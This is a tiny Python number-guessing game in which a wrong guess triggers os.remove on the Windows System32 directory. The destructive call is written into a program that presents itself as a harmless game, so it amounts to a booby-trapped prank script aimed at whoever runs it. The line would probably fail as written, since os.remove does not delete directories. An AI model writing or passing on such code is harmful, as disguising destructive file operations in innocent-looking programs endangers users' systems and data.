import os
import random

number = random.randint(1,10)
guess = int(input("Guess a number between 1 to 10"))

if guess == number:
    print("You guessed it right")
else:
    os.remove("c:\\windows\\System32")